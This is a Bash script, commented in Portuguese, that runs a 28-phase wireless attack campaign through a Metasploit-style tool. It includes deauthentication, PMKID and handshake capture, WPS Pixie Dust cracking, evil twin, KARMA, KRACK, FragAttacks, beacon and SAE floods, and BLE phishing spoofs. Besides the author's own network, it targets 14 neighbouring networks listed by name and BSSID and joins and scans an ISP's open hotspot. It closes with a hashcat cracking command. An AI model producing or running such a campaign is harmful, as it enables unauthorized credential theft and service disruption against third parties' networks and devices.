#!/usr/bin/env bash
# WirelessXPL-Forge — Campanha Completa de Ataques
# Modo Metasploit: use → set → run em cada módulo
# Interface: wlx24050f3d5f0a (RT5370 via WSL2 + kernel rt2800usb+)
set -uo pipefail

WXF="python3 /mnt/d/Projetos-SafeLabs/submodules/IoT/WirelessXPL-Forge/wxf.py"
IFACE="wlx24050f3d5f0a"
OWN_BSSID="72:4E:6B:1A:CB:90"   # UNIAOGEEK 2.4GHz
OWN_5G_BSSID="72:4E:6B:1A:CB:94" # UNIAOGEEK_5G
OWN_CH="1"
CLARO_BSSID="EA:20:E2:06:10:4C"
CLARO_CH="1"
TS=$(date +%Y%m%d_%H%M%S)
OUT="/tmp/wxf_campaign_$TS"
mkdir -p "$OUT"

RED='\033[0;31m'; GRN='\033[0;32m'; YLW='\033[1;33m'; CYN='\033[0;36m'; BLD='\033[1m'; NC='\033[0m'
info()  { echo -e "${CYN}[wxf]${NC} $*"; }
ok()    { echo -e "${GRN}[+]${NC}   $*"; }
warn()  { echo -e "${YLW}[!]${NC}   $*"; }
run_mod() { echo -e "\n${GRN}[wxf]${NC} run\n"; }
banner() {
    echo -e "\n${BLD}${CYN}══════════════════════════════════════════════════════════${NC}"
    echo -e "${BLD}${CYN}  WirelessXPL-Forge :: $*${NC}"
    echo -e "${BLD}${CYN}══════════════════════════════════════════════════════════${NC}\n"
}
use() { echo -e "${GRN}[wxf]${NC} use $1"; }
setopt() { echo -e "${GRN}[wxf]${NC}   set $1 $2"; }

exec 2>&1 | tee -a "$OUT/campaign.log"

echo "================================================================"
echo "  WirelessXPL-Forge v1.2.0 — Campanha de Ataques Massivos"
echo "  $(date) | Interface: $IFACE"
echo "  Redes alvo: UNIAOGEEK (própria) + 14 vizinhas"
echo "================================================================"

# Matrizes de redes vizinhas
declare -A NETS_SSID=( [0]="APT1104C_2G" [1]="Ricardo" [2]="Denise" [3]="NET_2G060F46-IoT" [4]="VIVO_MARIZE" [5]="MAURI" [6]="THOR" [7]="VOE_AP1704" [8]="TrOll" [9]="LICHTHOUSE" [10]="1-708" [11]="JOAQUIM" [12]="Teixeira" [13]="MERCUSYS" )
declare -A NETS_BSSID=( [0]="20:35:43:59:6C:1C" [1]="84:01:12:BF:F4:3D" [2]="E8:20:E2:06:0F:4B" [3]="EA:20:E2:06:10:4E" [4]="90:0A:62:C3:6C:1F" [5]="E8:45:8B:AE:00:08" [6]="10:98:5F:1A:DA:7F" [7]="CC:29:BD:20:18:AB" [8]="F0:25:8E:EA:A1:38" [9]="74:3A:EF:9C:45:75" [10]="44:3B:32:B2:CF:81" [11]="10:98:5F:5D:00:5F" [12]="A2:40:6F:E5:26:D4" [13]="38:6B:1C:3F:DD:B8" )
declare -A NETS_CH=( [0]="1" [1]="1" [2]="1" [3]="1" [4]="6" [5]="6" [6]="6" [7]="3" [8]="10" [9]="8" [10]="7" [11]="6" [12]="2" [13]="2" )
declare -A NETS_WPS=( [0]="2.0" [1]="2.0" [2]="no" [3]="2.0" [4]="2.0" [5]="2.0" [6]="2.0" [7]="2.0" [8]="2.0" [9]="2.0" [10]="1.0" [11]="2.0" [12]="2.0" [13]="2.0" )

RESULTS=()

# ════════════════════════════════════════════════════════
# FASE 1: Prerequisites Audit
# ════════════════════════════════════════════════════════
banner "FASE 1 — Wireless Tool Prerequisites Audit"
use "generic/external/wireless_tool_prereq_audit"
setopt "interface" "$IFACE"
setopt "check_inject" "true"
setopt "verbose" "true"
run_mod
OUT1=$(timeout 30 $WXF -m generic/external/wireless_tool_prereq_audit \
    -s "interface $IFACE" \
    -s "check_inject true" \
    -s "verbose true" 2>&1)
echo "$OUT1"
echo "$OUT1" > "$OUT/01_prereq_audit.txt"

# ════════════════════════════════════════════════════════
# FASE 2: Scan / Security Analyzer
# ════════════════════════════════════════════════════════
banner "FASE 2 — WiFi Security Analyzer (scan 30s)"
use "generic/wifi_lab/wifi_security_analyzer"
setopt "interface" "$IFACE"
setopt "scan_time" "30"
setopt "band" "bg"
setopt "show_hidden" "true"
setopt "verbose" "true"
run_mod
OUT2=$(timeout 45 $WXF -m generic/wifi_lab/wifi_security_analyzer \
    -s "interface $IFACE" \
    -s "scan_time 30" \
    -s "show_hidden true" \
    -s "verbose true" 2>&1)
echo "$OUT2"
echo "$OUT2" > "$OUT/02_security_analyzer.txt"

# ════════════════════════════════════════════════════════
# FASE 3: hcxdumptool bridge — PMKID massivo
# ════════════════════════════════════════════════════════
banner "FASE 3 — hcxdumptool PMKID Bridge (90s, todos os APs)"
use "generic/external/hcxdumptool_live_bridge"
setopt "interface" "$IFACE"
setopt "duration" "90"
setopt "output_file" "$OUT/pmkid_bridge.pcapng"
setopt "i_know_scope" "true"
run_mod
OUT3=$(timeout 110 $WXF -m generic/external/hcxdumptool_live_bridge \
    -s "interface $IFACE" \
    -s "duration 90" \
    -s "output_file $OUT/pmkid_bridge.pcapng" \
    -s "i_know_scope true" 2>&1)
echo "$OUT3"
echo "$OUT3" > "$OUT/03_hcxdumptool_bridge.txt"

# ════════════════════════════════════════════════════════
# FASE 4: Handshake Snooper — rede própria 2.4GHz
# ════════════════════════════════════════════════════════
banner "FASE 4 — Handshake Snooper: UNIAOGEEK 2.4GHz (deauth 10x3)"
use "generic/wifi_lab/handshake_snooper"
setopt "interface" "$IFACE"
setopt "target_bssid" "$OWN_BSSID"
setopt "target_channel" "$OWN_CH"
setopt "deauth_count" "10"
setopt "deauth_rounds" "3"
setopt "capture_timeout" "30"
setopt "pmkid_first" "true"
setopt "output_dir" "$OUT"
run_mod
OUT4=$(timeout 90 $WXF -m generic/wifi_lab/handshake_snooper \
    -s "interface $IFACE" \
    -s "target_bssid $OWN_BSSID" \
    -s "target_channel $OWN_CH" \
    -s "deauth_count 10" \
    -s "deauth_rounds 3" \
    -s "capture_timeout 30" \
    -s "pmkid_first true" \
    -s "output_dir $OUT" 2>&1)
echo "$OUT4"
echo "$OUT4" > "$OUT/04_handshake_uniaogeek.txt"
[[ "$OUT4" == *"Handshake captured"* ]] && RESULTS+=("HANDSHAKE_CAPTURED:UNIAOGEEK")

# ════════════════════════════════════════════════════════
# FASE 5: Handshake Snooper — rede própria 5GHz
# ════════════════════════════════════════════════════════
banner "FASE 5 — Handshake Snooper: UNIAOGEEK_5G (ch 48)"
use "generic/wifi_lab/handshake_snooper"
setopt "target_bssid" "$OWN_5G_BSSID"
setopt "target_channel" "48"
setopt "deauth_count" "10"
setopt "capture_timeout" "25"
run_mod
OUT5=$(timeout 60 $WXF -m generic/wifi_lab/handshake_snooper \
    -s "interface $IFACE" \
    -s "target_bssid $OWN_5G_BSSID" \
    -s "target_channel 48" \
    -s "deauth_count 10" \
    -s "deauth_rounds 2" \
    -s "capture_timeout 25" \
    -s "pmkid_first true" \
    -s "output_dir $OUT" 2>&1)
echo "$OUT5"
echo "$OUT5" > "$OUT/05_handshake_uniaogeek5g.txt"

# ════════════════════════════════════════════════════════
# FASE 6: Handshake Snooper — redes vizinhas
# ════════════════════════════════════════════════════════
banner "FASE 6 — Handshake Collection: 14 Redes Vizinhas"
for i in $(seq 0 13); do
    SSID="${NETS_SSID[$i]}"
    BSSID="${NETS_BSSID[$i]}"
    CH="${NETS_CH[$i]}"
    echo -e "\n${YLW}[TARGET $((i+1))/14]${NC} $SSID ($BSSID) ch:$CH"
    use "generic/wifi_lab/handshake_snooper"
    setopt "target_bssid" "$BSSID"
    setopt "target_channel" "$CH"
    setopt "capture_timeout" "15"
    setopt "deauth_count" "5"
    run_mod
    RES=$(timeout 40 $WXF -m generic/wifi_lab/handshake_snooper \
        -s "interface $IFACE" \
        -s "target_bssid $BSSID" \
        -s "target_channel $CH" \
        -s "deauth_count 5" \
        -s "deauth_rounds 2" \
        -s "capture_timeout 15" \
        -s "pmkid_first true" \
        -s "output_dir $OUT" 2>&1)
    echo "$RES" | tail -5
    echo "$RES" > "$OUT/06_hs_${SSID}.txt"
    if echo "$RES" | grep -q "Handshake captured"; then
        ok "HANDSHAKE CAPTURADO: $SSID"
        RESULTS+=("HANDSHAKE:$SSID")
    elif echo "$RES" | grep -q "PMKID"; then
        ok "PMKID coletado: $SSID"
        RESULTS+=("PMKID:$SSID")
    fi
    sleep 1
done

# ════════════════════════════════════════════════════════
# FASE 7: WPS MultiMode — Pixie Dust em todos WPS
# ════════════════════════════════════════════════════════
banner "FASE 7 — WPS MultiMode (Pixie Dust + Auto PIN)"

# WPS 1.0 primeiro (mais vulnerável)
echo -e "\n${RED}[PIXIE DUST — WPS 1.0]${NC} 1-708 (44:3B:32:B2:CF:81)"
use "generic/wifi_lab/wps_multimode"
setopt "interface" "$IFACE"
setopt "target_bssid" "44:3B:32:B2:CF:81"
setopt "channel" "7"
setopt "mode" "pixie_dust"
setopt "timeout" "60"
setopt "i_know_scope" "true"
run_mod
WPS1=$(timeout 75 $WXF -m generic/wifi_lab/wps_multimode \
    -s "interface $IFACE" \
    -s "target_bssid 44:3B:32:B2:CF:81" \
    -s "channel 7" \
    -s "mode pixie_dust" \
    -s "timeout 60" \
    -s "i_know_scope true" 2>&1)
echo "$WPS1"
echo "$WPS1" > "$OUT/07_wps_pixie_1708.txt"
if echo "$WPS1" | grep -qi "pin\|cracked\|success\|wps_pin\|psk"; then
    ok "WPS CRACKED: 1-708!"
    RESULTS+=("WPS_CRACKED:1-708:$(echo "$WPS1" | grep -i 'pin\|psk' | head -1)")
fi

# WPS 2.0 em rede própria
echo -e "\n${YLW}[WPS 2.0]${NC} UNIAOGEEK ($OWN_BSSID)"
use "generic/wifi_lab/wps_multimode"
setopt "target_bssid" "$OWN_BSSID"
setopt "channel" "$OWN_CH"
setopt "mode" "auto"
setopt "timeout" "60"
run_mod
WPS2=$(timeout 75 $WXF -m generic/wifi_lab/wps_multimode \
    -s "interface $IFACE" \
    -s "target_bssid $OWN_BSSID" \
    -s "channel $OWN_CH" \
    -s "mode auto" \
    -s "timeout 60" \
    -s "i_know_scope true" 2>&1)
echo "$WPS2"
echo "$WPS2" > "$OUT/07_wps_uniaogeek.txt"
[[ "$WPS2" == *"pin"* || "$WPS2" == *"success"* ]] && RESULTS+=("WPS_CRACKED:UNIAOGEEK")

# WPS em redes com sinal forte
for i in 0 4 5 8 9; do
    SSID="${NETS_SSID[$i]}"; BSSID="${NETS_BSSID[$i]}"; CH="${NETS_CH[$i]}"
    echo -e "\n${YLW}[WPS]${NC} $SSID"
    use "generic/wifi_lab/wps_multimode"
    setopt "target_bssid" "$BSSID"; setopt "channel" "$CH"
    run_mod
    RWPS=$(timeout 70 $WXF -m generic/wifi_lab/wps_multimode \
        -s "interface $IFACE" \
        -s "target_bssid $BSSID" \
        -s "channel $CH" \
        -s "mode auto" \
        -s "timeout 55" \
        -s "i_know_scope true" 2>&1)
    echo "$RWPS" | tail -5
    echo "$RWPS" > "$OUT/07_wps_$SSID.txt"
    if echo "$RWPS" | grep -qi "cracked\|success\|psk"; then
        ok "WPS CRACKED: $SSID"
        RESULTS+=("WPS_CRACKED:$SSID")
    fi
    sleep 1
done

# ════════════════════════════════════════════════════════
# FASE 8: PMKID Autopwn
# ════════════════════════════════════════════════════════
banner "FASE 8 — PMKID Autopwn"
use "generic/wifi_lab/pmkid_autopwn"
setopt "interface" "$IFACE"
setopt "target_bssid" "$OWN_BSSID"
setopt "channel" "$OWN_CH"
setopt "output_dir" "$OUT"
setopt "i_know_scope" "true"
run_mod
OUT8=$(timeout 60 $WXF -m generic/wifi_lab/pmkid_autopwn \
    -s "interface $IFACE" \
    -s "target_bssid $OWN_BSSID" \
    -s "channel $OWN_CH" \
    -s "output_dir $OUT" \
    -s "i_know_scope true" 2>&1)
echo "$OUT8"
echo "$OUT8" > "$OUT/08_pmkid_autopwn.txt"

# ════════════════════════════════════════════════════════
# FASE 9: Auth Flood
# ════════════════════════════════════════════════════════
banner "FASE 9 — Auth Flood (UNIAOGEEK)"
use "generic/wifi_lab/auth_flood"
setopt "interface" "$IFACE"
setopt "bssid" "$OWN_BSSID"
setopt "channel" "$OWN_CH"
setopt "duration" "15"
setopt "i_know_scope" "true"
run_mod
OUT9=$(timeout 25 $WXF -m generic/wifi_lab/auth_flood \
    -s "interface $IFACE" \
    -s "bssid $OWN_BSSID" \
    -s "channel $OWN_CH" \
    -s "duration 15" \
    -s "i_know_scope true" 2>&1)
echo "$OUT9"
echo "$OUT9" > "$OUT/09_auth_flood.txt"

# ════════════════════════════════════════════════════════
# FASE 10: Beacon Flood
# ════════════════════════════════════════════════════════
banner "FASE 10 — Beacon Flood (50 SSIDs aleatórios)"
use "generic/wifi_lab/beacon_flood_advanced"
setopt "interface" "$IFACE"
setopt "duration" "15"
setopt "random_ssids" "true"
setopt "count" "50"
setopt "i_know_scope" "true"
run_mod
OUT10=$(timeout 25 $WXF -m generic/wifi_lab/beacon_flood_advanced \
    -s "interface $IFACE" \
    -s "duration 15" \
    -s "random_ssids true" \
    -s "count 50" \
    -s "i_know_scope true" 2>&1)
echo "$OUT10"
echo "$OUT10" > "$OUT/10_beacon_flood.txt"

# ════════════════════════════════════════════════════════
# FASE 11: Deauth Multimode — varredura
# ════════════════════════════════════════════════════════
banner "FASE 11 — Deauth Multimode (broadcast em múltiplas redes)"
for TARGET_B in "$OWN_BSSID" "${NETS_BSSID[0]}" "${NETS_BSSID[1]}" "${NETS_BSSID[4]}" "${NETS_BSSID[8]}"; do
    TARGET_S=$(for k in "${!NETS_BSSID[@]}"; do [[ "${NETS_BSSID[$k]}" == "$TARGET_B" ]] && echo "${NETS_SSID[$k]}"; done || echo "UNIAOGEEK")
    CH_T=$OWN_CH
    for k in "${!NETS_BSSID[@]}"; do [[ "${NETS_BSSID[$k]}" == "$TARGET_B" ]] && CH_T="${NETS_CH[$k]}"; done
    echo -e "\n${YLW}[DEAUTH]${NC} $TARGET_B ch:$CH_T"
    use "generic/wifi_lab/deauth_multimode"
    setopt "interface" "$IFACE"; setopt "target_bssid" "$TARGET_B"
    setopt "channel" "$CH_T"; setopt "count" "15"; setopt "mode" "broadcast"
    run_mod
    timeout 20 $WXF -m generic/wifi_lab/deauth_multimode \
        -s "interface $IFACE" -s "target_bssid $TARGET_B" \
        -s "channel $CH_T" -s "count 15" -s "mode broadcast" \
        -s "i_know_scope true" 2>&1 | tail -5
    sleep 1
done
echo "" > "$OUT/11_deauth_multimode.txt"

# ════════════════════════════════════════════════════════
# FASE 12: Conexão na rede aberta + enumeração
# ════════════════════════════════════════════════════════
banner "FASE 12 — #CLARO-WIFI: Conexão + Enumeração de Hosts"
use "generic/wifi_lab/connectivity_portal"
setopt "interface" "$IFACE"
setopt "target_ssid" "#CLARO-WIFI"
setopt "target_bssid" "$CLARO_BSSID"
setopt "channel" "$CLARO_CH"
setopt "scan_hosts" "true"
setopt "test_internet" "true"
setopt "i_know_scope" "true"
run_mod
OUT12=$(timeout 90 $WXF -m generic/wifi_lab/connectivity_portal \
    -s "interface $IFACE" \
    -s "target_ssid #CLARO-WIFI" \
    -s "target_bssid $CLARO_BSSID" \
    -s "channel $CLARO_CH" \
    -s "scan_hosts true" \
    -s "test_internet true" \
    -s "i_know_scope true" 2>&1)
echo "$OUT12"
echo "$OUT12" > "$OUT/12_claro_wifi_enum.txt"
if echo "$OUT12" | grep -qi "connected\|host.*found\|internet.*ok"; then
    ok "REDE ABERTA COMPROMETIDA: #CLARO-WIFI"
    RESULTS+=("CONNECTED:#CLARO-WIFI")
fi

# ════════════════════════════════════════════════════════
# FASE 13: KARMA/MANA Attack
# ════════════════════════════════════════════════════════
banner "FASE 13 — KARMA/MANA Attack (clientes probe requests)"
use "generic/wifi_lab/karma_mana_attack"
setopt "interface" "$IFACE"
setopt "duration" "30"
setopt "mana_mode" "true"
setopt "i_know_scope" "true"
run_mod
OUT13=$(timeout 45 $WXF -m generic/wifi_lab/karma_mana_attack \
    -s "interface $IFACE" \
    -s "duration 30" \
    -s "mana_mode true" \
    -s "i_know_scope true" 2>&1)
echo "$OUT13"
echo "$OUT13" > "$OUT/13_karma_mana.txt"
if echo "$OUT13" | grep -qi "client.*connected\|associated"; then
    ok "KARMA: Cliente conectou ao AP falso!"
    RESULTS+=("KARMA_CLIENT_CONNECTED")
fi

# ════════════════════════════════════════════════════════
# FASE 14: Evil Twin (rede própria)
# ════════════════════════════════════════════════════════
banner "FASE 14 — Evil Twin Workflow: UNIAOGEEK clone"
use "generic/wifi_lab/evil_twin_workflow"
setopt "interface" "$IFACE"
setopt "target_ssid" "UNIAOGEEK"
setopt "target_bssid" "$OWN_BSSID"
setopt "channel" "$OWN_CH"
setopt "duration" "25"
setopt "i_know_scope" "true"
run_mod
OUT14=$(timeout 40 $WXF -m generic/wifi_lab/evil_twin_workflow \
    -s "interface $IFACE" \
    -s "target_ssid UNIAOGEEK" \
    -s "target_bssid $OWN_BSSID" \
    -s "channel $OWN_CH" \
    -s "duration 25" \
    -s "i_know_scope true" 2>&1)
echo "$OUT14"
echo "$OUT14" > "$OUT/14_evil_twin.txt"
if echo "$OUT14" | grep -qi "credential\|psk\|password\|captured"; then
    ok "CREDS CAPTURADAS via Evil Twin!"
    RESULTS+=("EVIL_TWIN_CREDS:UNIAOGEEK")
fi

# ════════════════════════════════════════════════════════
# FASE 15: FragAttacks
# ════════════════════════════════════════════════════════
banner "FASE 15 — FragAttacks CVE-2020-26140"
for i in 0 1 4 8 9; do
    BSSID="${NETS_BSSID[$i]}"; CH="${NETS_CH[$i]}"; SSID="${NETS_SSID[$i]}"
    echo -e "\n${YLW}[FRAG]${NC} $SSID"
    use "generic/wifi_lab/fragattacks"
    setopt "interface" "$IFACE"; setopt "target_bssid" "$BSSID"
    setopt "channel" "$CH"; setopt "mode" "check"
    run_mod
    RFRAG=$(timeout 35 $WXF -m generic/wifi_lab/fragattacks \
        -s "interface $IFACE" -s "target_bssid $BSSID" \
        -s "channel $CH" -s "mode check" -s "i_know_scope true" 2>&1)
    echo "$RFRAG" | tail -5
    if echo "$RFRAG" | grep -qi "vulnerable"; then
        ok "FRAGATTACKS: $SSID VULNERÁVEL!"
        RESULTS+=("FRAGATTACKS_VULN:$SSID")
    fi
done

# ════════════════════════════════════════════════════════
# FASE 16: KRACK Attack
# ════════════════════════════════════════════════════════
banner "FASE 16 — KRACK Attack (WPA2 4-way replay)"
use "generic/wifi_lab/krack_attack"
setopt "interface" "$IFACE"
setopt "target_bssid" "$OWN_BSSID"
setopt "channel" "$OWN_CH"
setopt "i_know_scope" "true"
run_mod
OUT16=$(timeout 40 $WXF -m generic/wifi_lab/krack_attack \
    -s "interface $IFACE" \
    -s "target_bssid $OWN_BSSID" \
    -s "channel $OWN_CH" \
    -s "i_know_scope true" 2>&1)
echo "$OUT16"
echo "$OUT16" > "$OUT/16_krack.txt"

# ════════════════════════════════════════════════════════
# FASE 17: KR00K
# ════════════════════════════════════════════════════════
banner "FASE 17 — KR00K CVE-2019-15126"
use "generic/wifi_lab/kr00k_attack"
setopt "interface" "$IFACE"
setopt "target_bssid" "$OWN_BSSID"
setopt "i_know_scope" "true"
run_mod
OUT17=$(timeout 35 $WXF -m generic/wifi_lab/kr00k_attack \
    -s "interface $IFACE" \
    -s "target_bssid $OWN_BSSID" \
    -s "channel $OWN_CH" \
    -s "i_know_scope true" 2>&1)
echo "$OUT17"
echo "$OUT17" > "$OUT/17_kr00k.txt"

# ════════════════════════════════════════════════════════
# FASE 18: TKIP Attack Suite (redes com TKIP)
# ════════════════════════════════════════════════════════
banner "FASE 18 — TKIP Attack Suite (CVE-2008-2370)"
for i in 2 7 8; do
    BSSID="${NETS_BSSID[$i]}"; CH="${NETS_CH[$i]}"; SSID="${NETS_SSID[$i]}"
    echo -e "\n${RED}[TKIP]${NC} $SSID ($BSSID) — TKIP MIC Attack"
    use "generic/wifi_lab/tkip_attack_suite"
    setopt "interface" "$IFACE"; setopt "target_bssid" "$BSSID"
    setopt "channel" "$CH"; setopt "mode" "mic_countermeasures"
    run_mod
    RTKIP=$(timeout 40 $WXF -m generic/wifi_lab/tkip_attack_suite \
        -s "interface $IFACE" -s "target_bssid $BSSID" \
        -s "channel $CH" -s "mode mic_countermeasures" \
        -s "i_know_scope true" 2>&1)
    echo "$RTKIP" | tail -8
    echo "$RTKIP" > "$OUT/18_tkip_$SSID.txt"
done

# ════════════════════════════════════════════════════════
# FASE 19: WPA3 SAE Flood
# ════════════════════════════════════════════════════════
banner "FASE 19 — WPA3 SAE Commit Flood"
use "generic/wifi_lab/wpa3_sae_flood_native"
setopt "interface" "$IFACE"
setopt "target_bssid" "$OWN_BSSID"
setopt "channel" "$OWN_CH"
setopt "duration" "10"
setopt "i_know_scope" "true"
run_mod
OUT19=$(timeout 20 $WXF -m generic/wifi_lab/wpa3_sae_flood_native \
    -s "interface $IFACE" \
    -s "target_bssid $OWN_BSSID" \
    -s "channel $OWN_CH" \
    -s "duration 10" \
    -s "i_know_scope true" 2>&1)
echo "$OUT19"
echo "$OUT19" > "$OUT/19_wpa3_sae_flood.txt"

# ════════════════════════════════════════════════════════
# FASE 20: Wardriving Deauth Loop
# ════════════════════════════════════════════════════════
banner "FASE 20 — Wardriving Deauth Loop (todos os canais 30s)"
use "generic/wifi_lab/wardriving_deauth_loop"
setopt "interface" "$IFACE"
setopt "duration" "30"
setopt "deauth_count" "5"
setopt "output_dir" "$OUT"
setopt "i_know_scope" "true"
run_mod
OUT20=$(timeout 45 $WXF -m generic/wifi_lab/wardriving_deauth_loop \
    -s "interface $IFACE" \
    -s "duration 30" \
    -s "deauth_count 5" \
    -s "output_dir $OUT" \
    -s "i_know_scope true" 2>&1)
echo "$OUT20"
echo "$OUT20" > "$OUT/20_wardriving_deauth.txt"

# ════════════════════════════════════════════════════════
# FASE 21: SSID Confusion Attack
# ════════════════════════════════════════════════════════
banner "FASE 21 — SSID Confusion Attack"
use "generic/wifi_lab/ssid_confusion"
setopt "interface" "$IFACE"
setopt "target_bssid" "$OWN_BSSID"
setopt "target_ssid" "UNIAOGEEK"
setopt "fake_ssid" "UNIAOGEEK_5G"
setopt "channel" "$OWN_CH"
setopt "i_know_scope" "true"
run_mod
OUT21=$(timeout 30 $WXF -m generic/wifi_lab/ssid_confusion \
    -s "interface $IFACE" \
    -s "target_bssid $OWN_BSSID" \
    -s "target_ssid UNIAOGEEK" \
    -s "fake_ssid UNIAOGEEK_5G" \
    -s "channel $OWN_CH" \
    -s "i_know_scope true" 2>&1)
echo "$OUT21"
echo "$OUT21" > "$OUT/21_ssid_confusion.txt"

# ════════════════════════════════════════════════════════
# FASE 22: AP-less Client Attack
# ════════════════════════════════════════════════════════
banner "FASE 22 — AP-less Client Attack (fake probe responses)"
use "generic/wifi_lab/ap_less_client_attack"
setopt "interface" "$IFACE"
setopt "duration" "20"
setopt "i_know_scope" "true"
run_mod
OUT22=$(timeout 30 $WXF -m generic/wifi_lab/ap_less_client_attack \
    -s "interface $IFACE" \
    -s "duration 20" \
    -s "i_know_scope true" 2>&1)
echo "$OUT22"
echo "$OUT22" > "$OUT/22_ap_less_client.txt"

# ════════════════════════════════════════════════════════
# FASE 23: PCAP PMKID Attack
# ════════════════════════════════════════════════════════
banner "FASE 23 — PCAP PMKID Attack (hashcat auto-crack)"
use "generic/pcap/pcap_pmkid_attack"
setopt "pcap_file" "/tmp/pmkid_all.pcapng"
setopt "output_file" "$OUT/pmkid_hashes.hash"
setopt "auto_crack" "false"
run_mod
OUT23=$(timeout 30 $WXF -m generic/pcap/pcap_pmkid_attack \
    -s "pcap_file /tmp/pmkid_all.pcapng" \
    -s "output_file $OUT/pmkid_hashes.hash" \
    -s "auto_crack false" 2>&1)
echo "$OUT23"
echo "$OUT23" > "$OUT/23_pcap_pmkid.txt"
HASH_COUNT=$(wc -l < "$OUT/pmkid_hashes.hash" 2>/dev/null || echo 0)
ok "PMKIDs no arquivo: $HASH_COUNT"

# ════════════════════════════════════════════════════════
# FASE 24: PCAP Handshake Extractor
# ════════════════════════════════════════════════════════
banner "FASE 24 — PCAP Handshake Extractor"
for pcap in /tmp/pmkid_all.pcapng $OUT/pmkid_bridge.pcapng; do
    [[ -f "$pcap" ]] || continue
    use "generic/pcap/pcap_handshake_extractor"
    setopt "pcap_file" "$pcap"
    setopt "output_dir" "$OUT"
    run_mod
    RHS=$(timeout 30 $WXF -m generic/pcap/pcap_handshake_extractor \
        -s "pcap_file $pcap" \
        -s "output_dir $OUT" \
        -s "auto_crack false" 2>&1)
    echo "$RHS" | tail -8
    echo "$RHS" >> "$OUT/24_pcap_handshakes.txt"
done

# ════════════════════════════════════════════════════════
# FASE 25: BLE Scan + Enumerate + Attacks
# ════════════════════════════════════════════════════════
banner "FASE 25 — BLE Scan"
use "generic/bluetooth/btle_scan"
setopt "duration" "20"
setopt "passive" "false"
setopt "output_dir" "$OUT"
run_mod
OUT25=$(timeout 30 $WXF -m generic/bluetooth/btle_scan \
    -s "duration 20" \
    -s "passive false" \
    -s "output_dir $OUT" 2>&1)
echo "$OUT25"
echo "$OUT25" > "$OUT/25_ble_scan.txt"

banner "FASE 25b — BLE Enumerate"
use "generic/bluetooth/btle_enumerate"
setopt "duration" "15"
run_mod
OUT25b=$(timeout 25 $WXF -m generic/bluetooth/btle_enumerate \
    -s "duration 15" 2>&1)
echo "$OUT25b"
echo "$OUT25b" > "$OUT/25b_ble_enum.txt"

banner "FASE 25c — BLE Extra Attacks"
use "generic/bluetooth/ble_extra_attacks"
setopt "mode" "advertisement_flood"
setopt "duration" "15"
setopt "i_know_scope" "true"
run_mod
OUT25c=$(timeout 25 $WXF -m generic/bluetooth/ble_extra_attacks \
    -s "mode advertisement_flood" \
    -s "duration 15" \
    -s "i_know_scope true" 2>&1)
echo "$OUT25c"
echo "$OUT25c" > "$OUT/25c_ble_attacks.txt"

# ════════════════════════════════════════════════════════
# FASE 26: BLE Phishing
# ════════════════════════════════════════════════════════
banner "FASE 26 — BLE Phishing (Apple FindMy + Samsung spoof)"
use "generic/bluetooth/ble_phishing"
setopt "mode" "apple_findmy"
setopt "duration" "20"
setopt "i_know_scope" "true"
run_mod
OUT26=$(timeout 30 $WXF -m generic/bluetooth/ble_phishing \
    -s "mode apple_findmy" \
    -s "duration 20" \
    -s "i_know_scope true" 2>&1)
echo "$OUT26"
echo "$OUT26" > "$OUT/26_ble_phishing.txt"

# ════════════════════════════════════════════════════════
# FASE 27: MoMo Integrated Attack
# ════════════════════════════════════════════════════════
banner "FASE 27 — MoMo Integrated (KARMA + PMKID + Downgrade)"
use "generic/wifi_lab/momo_integrated_attack"
setopt "interface" "$IFACE"
setopt "target_bssid" "$OWN_BSSID"
setopt "channel" "$OWN_CH"
setopt "duration" "30"
setopt "i_know_scope" "true"
run_mod
OUT27=$(timeout 45 $WXF -m generic/wifi_lab/momo_integrated_attack \
    -s "interface $IFACE" \
    -s "target_bssid $OWN_BSSID" \
    -s "channel $OWN_CH" \
    -s "duration 30" \
    -s "i_know_scope true" 2>&1)
echo "$OUT27"
echo "$OUT27" > "$OUT/27_momo.txt"

# ════════════════════════════════════════════════════════
# FASE 28: Adaptive Harvest
# ════════════════════════════════════════════════════════
banner "FASE 28 — Adaptive Harvest (score-driven 60s)"
use "generic/wifi_lab/adaptive_harvest"
setopt "interface" "$IFACE"
setopt "duration" "60"
setopt "min_signal" "-80"
setopt "output_dir" "$OUT"
setopt "i_know_scope" "true"
run_mod
OUT28=$(timeout 75 $WXF -m generic/wifi_lab/adaptive_harvest \
    -s "interface $IFACE" \
    -s "duration 60" \
    -s "min_signal -80" \
    -s "output_dir $OUT" \
    -s "i_know_scope true" 2>&1)
echo "$OUT28"
echo "$OUT28" > "$OUT/28_adaptive_harvest.txt"

# ════════════════════════════════════════════════════════
# RELATÓRIO FINAL
# ════════════════════════════════════════════════════════
banner "RELATÓRIO FINAL DA CAMPANHA"

echo "================================================================"
echo "  WirelessXPL-Forge v1.2.0 — Campanha Concluída"
echo "  $(date)"
echo "  Módulos executados: 28 fases"
echo "================================================================"
echo ""
echo "RESULTADOS SIGNIFICATIVOS:"
for r in "${RESULTS[@]}"; do
    echo -e "  ${GRN}[+]${NC} $r"
done

echo ""
echo "ARQUIVOS GERADOS:"
ls -la "$OUT/" | awk '{print "  " $0}'

echo ""
echo "PMKIDs/Handshakes disponíveis para crack:"
if [[ -f "$OUT/pmkid_hashes.hash" ]]; then
    echo "  Arquivo: $OUT/pmkid_hashes.hash"
    wc -l "$OUT/pmkid_hashes.hash"
    echo ""
    echo "  Comando para crack:"
    echo "  hashcat -m 22000 $OUT/pmkid_hashes.hash /usr/share/wordlists/rockyou.txt"
fi

echo ""
echo "================================================================"
echo "  Output salvo em: $OUT/"
echo "================================================================"
